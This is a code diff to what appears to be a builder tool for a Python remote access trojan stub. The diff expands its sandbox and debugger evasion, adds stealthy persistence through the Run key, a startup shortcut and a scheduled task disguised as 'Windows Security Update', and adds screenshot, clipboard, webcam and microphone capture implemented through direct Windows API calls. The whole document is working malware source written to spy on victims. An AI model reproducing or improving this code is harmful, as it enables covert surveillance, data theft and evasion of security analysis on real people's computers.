@@ -20,7 +20,8 @@ except ImportError:
         prompt('\n  \033[90mPress Enter to continue...\033[0m'); input()
 
 RAT_STUB = r'''
-import os, sys, time, json, base64, subprocess, urllib.request, urllib.error, threading, platform, shutil, ctypes, struct, io, ssl, socket, hashlib, uuid, random
+import os, sys, time, json, base64, subprocess, urllib.request, urllib.error, threading, platform, shutil, ctypes, struct, io, ssl, socket, hashlib, uuid, random, winreg
+from datetime import datetime, timedelta
 from datetime import datetime
 
 WEBHOOK_ENC = "{webhook_enc}"
@@ -82,60 +83,232 @@ def xor_dec(data, key="KevTool"):
     return xor_enc(data, key)
 
 def anti_vm():
+    score = 0
     try:
-        vm_artifacts = [
-            r"C:\\Windows\\System32\\vmGuestService.dll",
-            r"C:\\Windows\\System32\\vm3dmp.sys",
-            r"C:\\Windows\\System32\\VBoxGuest.sys",
-            r"C:\\Windows\\System32\\VBoxMouse.sys",
-            r"C:\\Windows\\System32\\VBoxSF.sys",
-            r"C:\\Program Files\\VMware\\VMware Tools",
-            r"C:\\Program Files\\Oracle\\VirtualBox Guest Additions",
+        vm_files = [
+            r"C:\Windows\System32\vmGuestService.dll", r"C:\Windows\System32\vm3dmp.sys",
+            r"C:\Windows\System32\VBoxGuest.sys", r"C:\Windows\System32\VBoxMouse.sys",
+            r"C:\Windows\System32\VBoxSF.sys", r"C:\Windows\System32\VBoxTray.exe",
+            r"C:\Windows\System32\vboxdisp.dll", r"C:\Windows\System32\vboxhook.dll",
+            r"C:\Windows\System32\vboxmnp.dll", r"C:\Windows\System32\vboxogl.dll",
+            r"C:\Windows\System32\vm3dmp_loader.dll", r"C:\Windows\System32\vmhgfs.dll",
+            r"C:\Windows\System32\drivers\vmci.sys", r"C:\Windows\System32\drivers\vmhgfs.sys",
+            r"C:\Windows\System32\drivers\vmmouse.sys", r"C:\Windows\System32\drivers\vmrawdsk.sys",
+            r"C:\Windows\System32\drivers\vmusbmouse.sys",
+            r"C:\Program Files\VMware\VMware Tools", r"C:\Program Files\Oracle\VirtualBox Guest Additions",
+            r"C:\Program Files\Qemu\qemu-ga", r"C:\Program Files\Parallels\Parallels Tools",
+            r"C:\Windows\System32\drivers\hvservice.sys", r"C:\Windows\System32\Hyper-V",
         ]
-        for path in vm_artifacts:
-            if os.path.exists(path):
-                dprint(f"VM detected: {{path}}")
-                return True
-        r = subprocess.run("wmic computersystem get manufacturer", shell=True, capture_output=True, text=True, timeout=5)
-        mfr = r.stdout.lower()
-        if any(x in mfr for x in ["vmware", "virtualbox", "qemu", "xen", "parallels"]):
-            dprint(f"VM detected via WMI: {{mfr.strip()}}")
-            return True
-        r = subprocess.run("wmic bios get serialnumber", shell=True, capture_output=True, text=True, timeout=5)
-        serial = r.stdout.lower()
-        if any(x in serial for x in ["vmware", "virtualbox", "00000"]):
-            dprint("VM detected via BIOS serial")
-            return True
+        for p in vm_files:
+            if os.path.exists(p):
+                score += 2
+                dprint(f"VM artifact: {{p}}")
+        try:
+            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS")
+            mfr, _ = winreg.QueryValueEx(k, "SystemManufacturer")
+            winreg.CloseKey(k)
+            m = mfr.lower()
+            if any(x in m for x in ["vmware", "virtualbox", "qemu", "xen", "parallels"]):
+                if "microsoft corporation" not in m or "virtual" in m:
+                    score += 3
+                    dprint(f"VM manufacturer: {{mfr}}")
+        except: pass
+        try:
+            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS")
+            serial, _ = winreg.QueryValueEx(k, "SystemSerialNumber")
+            winreg.CloseKey(k)
+            s = serial.lower()
+            vm_serials = ["vmware", "virtualbox", "00000", "ru000", "xr000", "tatvm", "not available",
+                          "innotek", "vbox", "parallax", "qemu", "6270670", "77847de1"]
+            if any(x in s for x in vm_serials):
+                score += 3
+                dprint(f"VM BIOS serial: {{serial[:50]}}")
+        except: pass
+        try:
+            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
+            uid, _ = winreg.QueryValueEx(k, "MachineGuid")
+            winreg.CloseKey(k)
+            u = uid.lower()
+            if any(x in u for x in ["00000000-0000-0000-0000-000000000000", "4c4c4544", "564d4143", "77847de1"]):
+                score += 2
+                dprint("VM UUID pattern")
+        except: pass
+        try:
+            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\disk\Enum")
+            disk, _ = winreg.QueryValueEx(k, "0")
+            winreg.CloseKey(k)
+            d = disk.lower()
+            vm_disks = ["vbox harddisk", "vmware", "qemu harddisk", "virtual disk", "amazon ec2",
+                        "nvme: amazon", "samsung pm961", "virtualbox", "xen"]
+            if any(x in d for x in vm_disks):
+                score += 2
+                dprint(f"VM disk: {{disk[:50]}}")
+        except: pass
+        try:
+            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS")
+            bios, _ = winreg.QueryValueEx(k, "BIOSVersion")
+            winreg.CloseKey(k)
+            b = bios.lower()
+            if any(x in b for x in ["vbox", "virtualbox", "vmware", "qemu", "xen", "parallels", "innotek"]):
+                score += 3
+                dprint(f"VM BIOS version: {{bios[:50]}}")
+        except: pass
+        try:
+            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS")
+            board, _ = winreg.QueryValueEx(k, "BaseBoardManufacturer")
+            winreg.CloseKey(k)
+            b = board.lower()
+            if any(x in b for x in ["vmware", "virtualbox", "qemu", "xen", "parallels", "oracle"]):
+                score += 2
+                dprint(f"VM motherboard: {{board[:50]}}")
+        except: pass
+        try:
+            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0")
+            cpu, _ = winreg.QueryValueEx(k, "ProcessorNameString")
+            winreg.CloseKey(k)
+            c = cpu.lower()
+            if any(x in c for x in ["qemu", "virtual cpu", "vmware virtual", "xen", "kvm"]):
+                score += 2
+                dprint(f"VM CPU: {{cpu[:50]}}")
+        except: pass
     except: pass
+    try:
+        user32 = ctypes.windll.user32
+        w = user32.GetSystemMetrics(0)
+        h = user32.GetSystemMetrics(1)
+        if w <= 800 and h <= 600:
+            score += 2
+            dprint(f"Small resolution: {{w}}x{{h}} (sandbox?)")
+    except: pass
+    if score >= 3:
+        dprint(f"VM detection score: {{score}} (threshold: 3)")
+        return True
     return False
 
 def anti_debug():
+    score = 0
+    k32 = ctypes.windll.kernel32
     try:
-        if ctypes.windll.kernel32.IsDebuggerPresent():
-            dprint("Debugger detected (IsDebuggerPresent)")
-            return True
+        if k32.IsDebuggerPresent():
+            score += 5
+            dprint("Debugger: IsDebuggerPresent")
     except: pass
     try:
-        sandbox_indicators = 0
-        r = subprocess.run("wmic cpu get NumberOfCores", shell=True, capture_output=True, text=True, timeout=5)
-        for line in r.stdout.split('\\n'):
-            line = line.strip()
-            if line.isdigit() and int(line) <= 1:
-                sandbox_indicators += 1
-        r = subprocess.run("wmic memorychip get Capacity", shell=True, capture_output=True, text=True, timeout=5)
-        for line in r.stdout.split('\\n'):
-            line = line.strip()
-            if line.isdigit() and int(line) < 2147483648:
-                sandbox_indicators += 1
-        r = subprocess.run("wmic diskdrive get Size", shell=True, capture_output=True, text=True, timeout=5)
-        for line in r.stdout.split('\\n'):
-            line = line.strip()
-            if line.isdigit() and int(line) < 32212254720:
-                sandbox_indicators += 1
-        if sandbox_indicators >= 2:
-            dprint("Sandbox detected (low resources)")
-            return True
+        h = k32.GetCurrentProcess()
+        is_dbg = ctypes.c_int(0)
+        k32.CheckRemoteDebuggerPresent(h, ctypes.byref(is_dbg))
+        if is_dbg.value:
+            score += 5
+            dprint("Debugger: CheckRemoteDebuggerPresent")
     except: pass
+    try:
+        k32.SetLastError(0)
+        ctypes.windll.ntdll.NtSetInformationThread(
+            k32.GetCurrentProcess(), 0x11, ctypes.byref(ctypes.c_int(0)), 4)
+    except: pass
+    try:
+        TH32CS_SNAPPROCESS = 0x00000002
+        class PROCESSENTRY32(ctypes.Structure):
+            _fields_ = [("dwSize", ctypes.c_ulong), ("cntUsage", ctypes.c_ulong),
+                        ("th32ProcessID", ctypes.c_ulong), ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
+                        ("th32ModuleID", ctypes.c_ulong), ("cntThreads", ctypes.c_ulong),
+                        ("th32ParentProcessID", ctypes.c_ulong), ("pcPriClassBase", ctypes.c_long),
+                        ("dwFlags", ctypes.c_ulong), ("szExeFile", ctypes.c_char * 260)]
+        snap = k32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+        running = []
+        if snap and snap != (0xFFFFFFFF if ctypes.sizeof(ctypes.c_void_p) == 4 else 0xFFFFFFFFFFFFFFFF):
+            pe = PROCESSENTRY32()
+            pe.dwSize = ctypes.sizeof(pe)
+            if k32.Process32First(snap, ctypes.byref(pe)):
+                while True:
+                    running.append(pe.szExeFile.decode(errors="replace").lower())
+                    if not k32.Process32Next(snap, ctypes.byref(pe)):
+                        break
+            k32.CloseHandle(snap)
+        dbgs = ["ollydbg.exe", "x32dbg.exe", "x64dbg.exe", "ida.exe", "idag.exe",
+                "idapro.exe", "radare2.exe", "r2.exe", "gdb.exe", "lldb.exe",
+                "windbg.exe", "ntsd.exe", "cdb.exe", "fiddler.exe", "charles.exe",
+                "httpdebuggerpro.exe", "wireshark.exe", "processhacker.exe",
+                "procmon.exe", "procmon64.exe", "cheatengine.exe", "dnspy.exe",
+                "de4dot.exe", "ildasm.exe", "httpanalyzer.exe", "tcpdump.exe"]
+        for dbg in dbgs:
+            if dbg in running:
+                score += 3
+                dprint(f"Debug tool: {{dbg}}")
+        sandbox_tools = ["wireshark", "fiddler", "charles", "httpdebugger", "httpanalyzer",
+                         "tcpdump", "windump", "mitmproxy", "burp", "zap",
+                         "procmon", "processhacker", "autoruns", "procexp",
+                         "dumpcap", "pestudio", "detect it easy"]
+        for tool in sandbox_tools:
+            for proc in running:
+                if tool in proc:
+                    score += 2
+                    dprint(f"Sandbox tool: {{proc}}")
+                    break
+    except: pass
+    try:
+        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor")
+        cpu_count = winreg.QueryInfoKey(k)[0]
+        winreg.CloseKey(k)
+        if cpu_count <= 1:
+            score += 1
+            dprint("Single CPU (sandbox?)")
+    except: pass
+    try:
+        class MEMORYSTATUSEX(ctypes.Structure):
+            _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
+                        ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
+                        ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
+                        ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
+                        ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
+        mem = MEMORYSTATUSEX()
+        mem.dwLength = ctypes.sizeof(mem)
+        k32.GlobalMemoryStatusEx(ctypes.byref(mem))
+        if mem.ullTotalPhys < 2 * 1024**3:
+            score += 3
+            dprint(f"Low RAM: {{mem.ullTotalPhys // (1024**3)}}GB (sandbox?)")
+    except: pass
+    try:
+        free = ctypes.c_ulonglong(0)
+        total = ctypes.c_ulonglong(0)
+        k32.GetDiskFreeSpaceExW("C:\\\\", None, ctypes.byref(total), ctypes.byref(free))
+        if total.value < 32 * 1024**3:
+            score += 3
+            dprint(f"Small disk: {{total.value // (1024**3)}}GB (sandbox?)")
+    except: pass
+    try:
+        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Windows")
+        val, _ = winreg.QueryValueEx(k, "ShutdownTime")
+        winreg.CloseKey(k)
+        import struct as _st
+        ft = _st.unpack("<Q", val)[0]
+        boot_time = datetime(1601, 1, 1) + timedelta(microseconds=ft // 10)
+        mins = (datetime.now() - boot_time).total_seconds() / 60
+        if mins < 5:
+            score += 2
+            dprint(f"Fresh boot: {{mins:.0f}}min ago (sandbox?)")
+    except: pass
+    try:
+        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
+        uid, _ = winreg.QueryValueEx(k, "MachineGuid")
+        winreg.CloseKey(k)
+        u = uid.lower()
+        if any(x in u for x in ["00000000-0000-0000-0000-000000000000", "77847de1",
+                                 "00000000-0000-0000-c000-000000000000"]):
+            score += 2
+            dprint("Sandbox: generic UUID")
+    except: pass
+    try:
+        user32 = ctypes.windll.user32
+        w = user32.GetSystemMetrics(0)
+        h = user32.GetSystemMetrics(1)
+        if w <= 800 and h <= 600:
+            score += 2
+            dprint(f"Tiny resolution: {{w}}x{{h}}")
+    except: pass
+    if score >= 4:
+        dprint(f"Anti-debug score: {{score}} (threshold: 4)")
+        return True
     return False
 
 def get_pc_id():
@@ -293,7 +466,7 @@ def setup_channels():
     return True
 
 def get_persist_name():
-    custom = "{{PERSIST_NAME}}"
+    custom = "{PERSIST_NAME}"
     if custom and custom != "csrss":
         return custom
     idx = hash(os.getenv("USERNAME", "")) % len(PERSIST_NAMES)
@@ -308,11 +481,9 @@ def persist():
         startup = os.path.join(os.getenv("APPDATA", "."), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
         startup_dst = os.path.join(startup, exe_name + ".lnk")
         task_name = "WindowsSecurityUpdate"
-
         if os.path.isfile(dst):
             dprint(f"Already persisted at {{dst}}")
             return
-
         if src != dst:
             shutil.copy2(src, dst)
             dprint(f"Copied to {{dst}}")
@@ -320,108 +491,106 @@ def persist():
                 subprocess.Popen([dst], creationflags=0x08000000)
                 dprint("Spawned persisted copy")
             except: pass
-
-        key = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
         try:
             ctypes.windll.advapi32.RegSetValueExW(
                 ctypes.windll.advapi32.RegOpenKeyExW(
                     ctypes.windll.user32.HKEY_CURRENT_USER, key, 0, 0x20006, ctypes.byref(ctypes.c_ulong(0))
-                ), "WindowsSecurity", 0, 1, dst, len(dst)*2
-            )
+                ), "WindowsSecurity", 0, 1, dst, len(dst)*2)
             dprint("Registry persistence set (HKCU Run)")
         except Exception as e:
             dprint(f"Registry persist failed: {{e}}")
-
         try:
-            ps_sc = (
-                "$s=(New-Object -COM WScript.Shell);"
-                "$lnk=$s.CreateShortcut('" + startup_dst + "');"
-                "$lnk.TargetPath='" + dst + "';"
-                "$lnk.WindowStyle=7;"
-                "$lnk.Description='Windows Security Update';"
-                "$lnk.Save()"
-            )
-            subprocess.run(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_sc],
-                           capture_output=True, timeout=10)
+            vbs = "Set s = CreateObject(\"WScript.Shell\"):Set lnk = s.CreateShortcut(\"" + startup_dst.replace("\\", "\\\\") + "\"):lnk.TargetPath = \"" + dst.replace("\\", "\\\\") + "\":lnk.WindowStyle = 7:lnk.Description = \"Windows Security Update\":lnk.Save()"
+            vbs_path = os.path.join(os.getenv("TEMP", "."), "s.vbs")
+            with open(vbs_path, "w") as f:
+                f.write(vbs)
+            subprocess.run(["wscript", vbs_path], capture_output=True, timeout=10)
+            try: os.remove(vbs_path)
+            except: pass
             dprint("Startup shortcut created")
         except Exception as e:
             dprint(f"Startup shortcut failed: {{e}}")
-
         try:
-            ps_task = (
-                f'schtasks /create /tn "{{task_name}}" /tr "\\"{{dst}}\\"" /sc onlogon /rl highest /f'
-            )
-            r = subprocess.run(ps_task, shell=True, capture_output=True, text=True, timeout=10)
+            r = subprocess.run(["schtasks", "/create", "/tn", task_name, "/tr", dst, "/sc", "onlogon", "/rl", "highest", "/f"],
+                               capture_output=True, text=True, timeout=10)
             if r.returncode == 0:
                 dprint("Scheduled task created (on logon)")
             else:
                 dprint(f"Task sched failed: {{r.stderr[:100]}}")
         except Exception as e:
             dprint(f"Task sched error: {{e}}")
-
         dprint("Persistence complete (registry + startup + scheduled task)")
     except Exception as e:
         dprint(f"Persist error: {{e}}")
 
 def get_info():
-    info = {{"user": os.getenv("USERNAME", "?"), "computer": platform.node(), "os": platform.platform(), "ip": "?", "cwd": os.getcwd(), "python": platform.python_version()}}
+    info = {"user": os.getenv("USERNAME", "?"), "computer": platform.node(), "os": platform.platform(), "ip": "?", "cwd": os.getcwd(), "python": platform.python_version()}
     try:
         info["ip"] = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
     except: pass
     try:
-        r = subprocess.run("wmic os get FreePhysicalMemory /Value", shell=True, capture_output=True, text=True, timeout=5)
-        for line in r.stdout.split("\\n"):
-            if "FreePhysicalMemory" in line and "=" in line:
-                kb = int(line.split("=")[1].strip())
-                info["ram_free"] = f"{{kb/1048576:.1f}} GB"
-    except: pass
-    try:
-        r = subprocess.run("wmic os get TotalVisibleMemorySize /Value", shell=True, capture_output=True, text=True, timeout=5)
-        for line in r.stdout.split("\\n"):
-            if "TotalVisibleMemorySize" in line and "=" in line:
-                kb = int(line.split("=")[1].strip())
-                info["ram_total"] = f"{{kb/1048576:.1f}} GB"
+        k32 = ctypes.windll.kernel32
+        class MEMORYSTATUSEX(ctypes.Structure):
+            _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
+                        ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
+                        ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
+                        ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
+                        ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
+        mem = MEMORYSTATUSEX()
+        mem.dwLength = ctypes.sizeof(mem)
+        k32.GlobalMemoryStatusEx(ctypes.byref(mem))
+        info["ram_free"] = f"{{mem.ullAvailPhys / (1024**3):.1f}} GB"
+        info["ram_total"] = f"{{mem.ullTotalPhys / (1024**3):.1f}} GB"
     except: pass
     return info
 
 CMDS_WEBHOOK = None
 
 def take_screenshot():
-    tmp = os.path.join(os.getenv("TEMP", "."), "rat_screen.bmp")
     try:
-        if sys.platform == 'win32':
-            ps = (
-                "Add-Type -AssemblyName System.Windows.Forms;"
-                "Add-Type -AssemblyName System.Drawing;"
-                "$b = New-Object System.Drawing.Bitmap("
-                "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,"
-                "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);"
-                "$g = [System.Drawing.Graphics]::FromImage($b);"
-                "$g.CopyFromScreen(0, 0, 0, 0, $b.Size);"
-                "$b.Save('" + tmp.replace("\\", "\\\\") + "');"
-                "$g.Dispose(); $b.Dispose()"
-            )
-            r = subprocess.run(
-                ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps],
-                capture_output=True, text=True, timeout=10
-            )
-            if r.returncode != 0:
-                dprint(f"PS screenshot stderr: {{r.stderr[:200]}}")
-            if os.path.isfile(tmp):
-                with open(tmp, 'rb') as f:
-                    data = f.read()
-                if len(data) > 1000:
-                    dprint(f"Screenshot captured: {{len(data)}} bytes")
-                    return data
-                else:
-                    dprint("Screenshot file too small, likely empty")
-            else:
-                dprint("Screenshot temp file not created")
+        user32 = ctypes.windll.user32
+        gdi32 = ctypes.windll.gdi32
+        SRCCOPY = 0x00CC0020
+        w = user32.GetSystemMetrics(0)
+        h = user32.GetSystemMetrics(1)
+        hdc_screen = user32.GetDC(0)
+        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
+        hbitmap = gdi32.CreateCompatibleBitmap(hdc_screen, w, h)
+        gdi32.SelectObject(hdc_mem, hbitmap)
+        gdi32.BitBlt(hdc_mem, 0, 0, w, h, hdc_screen, 0, 0, SRCCOPY)
+        class BITMAPINFOHEADER(ctypes.Structure):
+            _fields_ = [("biSize", ctypes.c_ulong), ("biWidth", ctypes.c_long),
+                        ("biHeight", ctypes.c_long), ("biPlanes", ctypes.c_ushort),
+                        ("biBitCount", ctypes.c_ushort), ("biCompression", ctypes.c_ulong),
+                        ("biSizeImage", ctypes.c_ulong), ("biXPelsPerMeter", ctypes.c_long),
+                        ("biYPelsPerMeter", ctypes.c_long), ("biClrUsed", ctypes.c_ulong),
+                        ("biClrImportant", ctypes.c_ulong)]
+        bmi = BITMAPINFOHEADER()
+        bmi.biSize = ctypes.sizeof(bmi)
+        bmi.biWidth = w
+        bmi.biHeight = -h
+        bmi.biPlanes = 1
+        bmi.biBitCount = 32
+        bmi.biCompression = 0
+        buf = ctypes.create_string_buffer(w * h * 4)
+        gdi32.GetDIBits(hdc_mem, hbitmap, 0, h, buf, ctypes.byref(bmi), 0)
+        gdi32.DeleteObject(hbitmap)
+        gdi32.DeleteDC(hdc_mem)
+        user32.ReleaseDC(0, hdc_screen)
+        bfh = struct.pack("<2sIHHI", b"BM", 54 + w * h * 4, 0, 0, 54)
+        bih = struct.pack("<IiiHHIIiiII", 40, w, -h, 1, 32, 0, w * h * 4, 0, 0, 0, 0)
+        tmp = os.path.join(os.getenv("TEMP", "."), "rs.bmp")
+        with open(tmp, "wb") as f:
+            f.write(bfh + bih + buf.raw)
+        if os.path.isfile(tmp) and os.path.getsize(tmp) > 1000:
+            with open(tmp, "rb") as f:
+                data = f.read()
+            dprint(f"Screenshot captured: {{len(data)}} bytes")
+            os.remove(tmp)
+            return data
     except Exception as e:
         dprint(f"Screenshot error: {{e}}")
-    finally:
-        try: os.remove(tmp)
-        except: pass
     return None
 
 def run_command(cmd):
@@ -437,10 +606,43 @@ def run_command(cmd):
 
 def get_clipboard():
     try:
-        r = subprocess.run(["powershell", "-NoProfile", "-Command", "Get-Clipboard"],
-                           capture_output=True, text=True, timeout=5)
-        return r.stdout.strip() or "(empty)"
+        u32 = ctypes.windll.user32
+        CF_UNICODETEXT = 13
+        if not u32.IsClipboardFormatAvailable(CF_UNICODETEXT):
+            return "(empty)"
+        if not u32.OpenClipboard(0):
+            return "(error)"
+        h = u32.GetClipboardData(CF_UNICODETEXT)
+        if not h:
+            u32.CloseClipboard()
+            return "(empty)"
+        ptr = u32.GlobalLock(h)
+        if not ptr:
+            u32.CloseClipboard()
+            return "(error)"
+        text = ctypes.c_wchar_p(ptr).value
+        u32.GlobalUnlock(h)
+        u32.CloseClipboard()
+        return text or "(empty)"
     except: return "(error)"
+
+def _set_clipboard(text):
+    try:
+        u32 = ctypes.windll.user32
+        k32 = ctypes.windll.kernel32
+        CF_UNICODETEXT = 13
+        if not u32.OpenClipboard(0):
+            return False
+        u32.EmptyClipboard()
+        raw = text.encode("utf-16-le") + b"\x00\x00"
+        h = k32.GlobalAlloc(0x0042, len(raw))
+        ptr = k32.GlobalLock(h)
+        ctypes.memmove(ptr, raw, len(raw))
+        k32.GlobalUnlock(h)
+        u32.SetClipboardData(CF_UNICODETEXT, h)
+        u32.CloseClipboard()
+        return True
+    except: return False
 
 def list_files(path):
     try:
@@ -490,40 +692,36 @@ def get_wifi():
 
 def webcam_capture():
     try:
-        tmp = os.path.join(os.getenv("TEMP", "."), "webcam.jpg")
-        ps = (
-            "Add-Type -AssemblyName System.Windows.Forms;"
-            "Add-Type -TypeDefinition '"
-            "using System;using System.Runtime.InteropServices;using System.Drawing;using System.Drawing.Imaging;"
-            "public class CamCapture{{"
-            "[DllImport(\"user32.dll\")]public static extern IntPtr GetDesktopWindow();"
-            "[DllImport(\"avicap32.dll\",CharSet=CharSet.Unicode)]public static extern IntPtr capCreateCaptureWindowW("
-            "string lpszWindowName,int dwStyle,int x,int y,int nWidth,int nHeight,IntPtr hWndParent,int nID);"
-            "[DllImport(\"user32.dll\")]public static extern bool SendMessage(IntPtr hWnd,int Msg,int wParam,int lParam);"
-            "[DllImport(\"user32.dll\")]public static extern bool DestroyWindow(IntPtr hWnd);"
-            "public static bool Capture(string path){{"
-            "IntPtr h=capCreateCaptureWindowW(\"cap\",0x40000000|0x10000000,0,0,640,480,GetDesktopWindow(),0);"
-            "if(h==IntPtr.Zero)return false;"
-            "SendMessage(h,0x40a,0,0);System.Threading.Thread.Sleep(1000);"
-            "SendMessage(h,0x41e,0,0);System.Threading.Thread.Sleep(500);"
-            "IntPtr bmp=IntPtr.Zero;"
-            "SendMessage(h,0x419,0,ref bmp);"
-            "if(bmp==IntPtr.Zero){{DestroyWindow(h);return false;}}"
-            "Image img=Image.FromHbitmap(bmp);img.Save(path,ImageFormat.Jpeg);img.Dispose();"
-            "DestroyWindow(h);return true;}}"
-            "}}';"
-            "$cap=[CamCapture]::new();"
-            "if($cap.Capture('" + tmp.replace("\\", "\\\\") + "')){{exit 0}}else{{exit 1}}"
-        )
-        r = subprocess.run(
-            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps],
-            capture_output=True, text=True, timeout=15
-        )
+        tmp = os.path.join(os.getenv("TEMP", "."), "webcam.bmp")
+        user32 = ctypes.windll.user32
+        avicap = ctypes.windll.avicap32
+        WM_CAP_START = 0x400
+        WM_CAP_DRIVER_CONNECT = WM_CAP_START + 10
+        WM_CAP_SET_PREVIEWRATE = WM_CAP_START + 52
+        WM_CAP_SET_PREVIEW = WM_CAP_START + 50
+        WM_CAP_SAVEDIB = WM_CAP_START + 25
+        WM_CAP_STOP = WM_CAP_START + 68
+        capCreate = avicap.capCreateCaptureWindowW
+        capCreate.argtypes = [ctypes.c_wchar_p, ctypes.c_ulong, ctypes.c_int, ctypes.c_int,
+                              ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int]
+        capCreate.restype = ctypes.c_void_p
+        hwnd = capCreate("cap", 0x50000000, 0, 0, 640, 480, None, 0)
+        if not hwnd:
+            return None
+        user32.SendMessageW(hwnd, WM_CAP_DRIVER_CONNECT, 0, 0)
+        time.sleep(1)
+        user32.SendMessageW(hwnd, WM_CAP_SET_PREVIEWRATE, 33, 0)
+        user32.SendMessageW(hwnd, WM_CAP_SET_PREVIEW, 1, 0)
+        time.sleep(2)
+        tmp_buf = ctypes.c_wchar_p(tmp)
+        user32.SendMessageW(hwnd, WM_CAP_SAVEDIB, 0, ctypes.addressof(tmp_buf))
+        time.sleep(1)
+        user32.SendMessageW(hwnd, WM_CAP_STOP, 0, 0)
+        user32.SendMessageW(hwnd, 0x0010, 0, 0)
         if os.path.isfile(tmp) and os.path.getsize(tmp) > 1000:
-            with open(tmp, 'rb') as f:
+            with open(tmp, "rb") as f:
                 data = f.read()
-            try: os.remove(tmp)
-            except: pass
+            os.remove(tmp)
             return data
     except Exception as e:
         dprint(f"Webcam error: {{e}}")
@@ -532,57 +730,54 @@ def webcam_capture():
 def audio_record(duration=5):
     try:
         tmp = os.path.join(os.getenv("TEMP", "."), "audio.wav")
-        ps = (
-            "Add-Type -AssemblyName System.Windows.Forms;"
-            "$sr=22050;$bits=16;$ch=1;"
-            "$bps=$sr*($bits/8)*$ch;"
-            "$w=New-Object System.IO.BinaryWriter([System.IO.File]::Create('" + tmp.replace("\\", "\\\\") + "'));"
-            "Add-Type -TypeDefinition '"
-            "using System;using System.Runtime.InteropServices;"
-            "public class AudioIn{{"
-            "[DllImport(\"winmm.dll\")]public static extern int waveInOpen(out IntPtr h,int fmt,IntPtr fmtex,IntPtr c,IntPtr u,int f);"
-            "[DllImport(\"winmm.dll\")]public static extern int waveInStart(IntPtr h);"
-            "[DllImport(\"winmm.dll\")]public static extern int waveInStop(IntPtr h);"
-            "[DllImport(\"winmm.dll\")]public static extern int waveInClose(IntPtr h);"
-            "[DllImport(\"winmm.dll\")]public static extern int waveInPrepareHeader(IntPtr h,IntPtr wh,int s);"
-            "[DllImport(\"winmm.dll\")]public static extern int waveInUnprepareHeader(IntPtr h,IntPtr wh,int s);"
-            "[DllImport(\"winmm.dll\")]public static extern int waveInAddBuffer(IntPtr h,IntPtr wh,int s);"
-            "[DllImport(\"winmm.dll\")]public static extern int waveInReset(IntPtr h);"
-            "[StructLayout(LayoutKind.Sequential)]public struct WAVEFORMATEX{{public short wFormatTag;public short nChannels;"
-            "public int nSamplesPerSec;public int nAvgBytesPerSec;public short nBlockAlign;public short wBitsPerSample;public short cbSize;}}"
-            "[StructLayout(LayoutKind.Sequential)]public struct WAVEHDR{{public IntPtr lpData;public int dwBufferLength;"
-            "public int dwBytesRecorded;public IntPtr dwUser;public int dwFlags;public int dwLoops;public IntPtr lpNext;public int reserved;}}"
-            "}}';"
-            "$fmt=New-Object AudioIn+WAVEFORMATEX;"
-            "$fmt.wFormatTag=1;$fmt.nChannels=1;$fmt.nSamplesPerSec=22050;"
-            "$fmt.nAvgBytesPerSec=44100;$fmt.nBlockAlign=2;$fmt.wBitsPerSample=16;$fmt.cbSize=0;"
-            "$h=[IntPtr]::Zero;"
-            "$r=[AudioIn]::waveInOpen([ref]$h,1,[ref]$fmt,[IntPtr]::Zero,[IntPtr]::Zero,0);"
-            "if($r -ne 0){{$w.Close();exit 1}}"
-            "$hdr=New-Object AudioIn+WAVEHDR;"
-            "$hdr.lpData=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(4096);"
-            "$hdr.dwBufferLength=4096;"
-            "[AudioIn]::waveInPrepareHeader($h,[ref]$hdr,[System.Runtime.InteropServices.Marshal]::SizeOf($hdr));"
-            "[AudioIn]::waveInAddBuffer($h,[ref]$hdr,[System.Runtime.InteropServices.Marshal]::SizeOf($hdr));"
-            "[AudioIn]::waveInStart($h);"
-            "Start-Sleep -Seconds " + str(duration) + ";"
-            "[AudioIn]::waveInStop($h);"
